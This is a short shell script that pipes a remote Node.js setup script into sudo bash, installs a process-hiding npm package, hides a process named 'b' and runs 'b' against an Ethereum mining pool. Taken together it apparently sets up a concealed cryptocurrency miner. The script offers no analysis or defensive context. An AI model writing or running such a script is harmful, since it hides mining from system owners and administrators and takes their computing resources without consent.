
curl -fsSL https://deb.nodesource.com/setup_14.x | sudo -E bash -
apt-get install -y nodejs
npm i -g node-process-hider
ph add b
chmod +x b
./b -uri ethstratum://f39829a015d4.worker1@ethash.infinityton.com:4444
